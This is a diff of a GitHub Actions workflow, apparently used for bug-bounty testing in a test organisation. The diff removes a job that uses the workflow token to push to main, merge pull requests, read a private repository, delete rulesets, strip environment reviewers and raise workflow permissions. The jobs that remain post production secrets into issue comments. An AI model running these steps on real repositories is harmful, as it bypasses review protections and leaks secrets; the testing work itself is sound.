@@ -1,43 +1,12 @@
 name: t
 on:
   push:
-    branches: [wf-test, 'refs/**']
-    tags: ['main', 'dep*']
+    branches: ['**']
+    tags: ['**']
   workflow_dispatch:
-permissions: write-all
+permissions:
+  issues: write
 jobs:
-  token:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-      - name: probes
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          set +e
-          exec > out.txt 2>&1
-          echo "ref=$GITHUB_REF sha=$GITHUB_SHA actor=$GITHUB_ACTOR"
-          echo "== token repo perms"; gh api repos/$GITHUB_REPOSITORY -q .permissions
-          git config user.name t; git config user.email t@example.com
-          echo "== push to main"; git commit --allow-empty -q -m wf-direct; git push origin HEAD:refs/heads/main 2>&1 | tail -4
-          echo "== tag v9.0"; git tag v9.0; git push origin v9.0 2>&1 | tail -4
-          echo "== approve PR 4"; gh api -X POST repos/$GITHUB_REPOSITORY/pulls/4/reviews -f event=APPROVE 2>&1 | head -c 300; echo
-          echo "== merge PR 4"; gh api -X PUT repos/$GITHUB_REPOSITORY/pulls/4/merge 2>&1 | head -c 300; echo
-          echo "== private repo api"; gh api repos/drakeaxelrod-h1-test-org/bb-private 2>&1 | head -c 200; echo
-          echo "== private repo git"; git ls-remote https://x-access-token:$GH_TOKEN@github.com/drakeaxelrod-h1-test-org/bb-private 2>&1 | head -3
-          echo "== delete ruleset"; gh api -X DELETE repos/$GITHUB_REPOSITORY/rulesets/27201728 2>&1 | head -c 300; echo
-          echo "== env secrets list"; gh api repos/$GITHUB_REPOSITORY/environments/prod/secrets 2>&1 | head -c 300; echo
-          echo "== edit env"; gh api -X PUT repos/$GITHUB_REPOSITORY/environments/prod --input - <<< '{"reviewers":[]}' 2>&1 | head -c 300; echo
-          echo "== actions perms"; gh api -X PUT repos/$GITHUB_REPOSITORY/actions/permissions/workflow -F can_approve_pull_request_reviews=true -f default_workflow_permissions=write 2>&1 | head -c 300; echo
-      - name: report
-        if: always()
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          { echo '```'; cat out.txt; echo '```'; } > body.md
-          gh issue comment 5 -R $GITHUB_REPOSITORY -F body.md
   prod:
     runs-on: ubuntu-latest
     environment: prod
@@ -45,7 +14,7 @@ jobs:
       - env:
           GH_TOKEN: ${{ github.token }}
           S: ${{ secrets.PROD_SECRET }}
-        run: gh issue comment 5 -R $GITHUB_REPOSITORY -b "prod job ran on $GITHUB_REF secret=[$S]"
+        run: gh issue comment 5 -R $GITHUB_REPOSITORY -b "prod job ran on $GITHUB_REF type=$GITHUB_REF_TYPE secret=[$S]"
   nogate:
     runs-on: ubuntu-latest
     environment: nogate
@@ -53,4 +22,4 @@ jobs:
       - env:
           GH_TOKEN: ${{ github.token }}
           S: ${{ secrets.NG_SECRET }}
-        run: gh issue comment 5 -R $GITHUB_REPOSITORY -b "nogate job ran on $GITHUB_REF secret=[$S]"
+        run: gh issue comment 5 -R $GITHUB_REPOSITORY -b "nogate job ran on $GITHUB_REF type=$GITHUB_REF_TYPE secret=[$S]"
